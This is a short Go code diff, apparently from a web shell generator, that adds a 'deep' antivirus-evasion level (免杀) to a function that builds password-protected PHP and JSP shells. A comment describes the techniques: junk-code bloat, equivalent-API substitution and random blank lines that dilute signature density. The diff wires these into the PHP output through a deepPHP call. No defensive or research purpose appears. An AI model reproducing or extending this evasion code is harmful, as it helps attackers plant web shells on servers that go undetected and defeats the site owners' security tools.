@@ -10,9 +10,11 @@ import (
 	"strings"
 )
 
-// EvasiveOpts 免杀选项。
+// EvasiveOpts 免杀选项。Level：1=标准（函数拼接+随机变量+伪装注释+include 链）；
+// 2=深度（再加垃圾代码膨胀、等价 API 替换、随机空行稀释特征密度）。
 type EvasiveOpts struct {
 	Enabled bool
+	Level   int
 }
 
 var evasiveJunkComments = []string{
@@ -112,6 +114,9 @@ func GenerateShellEvasive(scriptType, encoder, password string, gate GateOpts, e
 			inner := strings.TrimPrefix(gp, "<?php\n")
 			inner = strings.TrimSuffix(inner, "?>\n")
 			code = strings.Replace(code, "<?php\n", "<?php\n"+inner, 1)
+		}
+		if ev.Level >= 2 {
+			code = deepPHP(code)
 		}
 		return code, nil
 	case "jsp", "jspx":
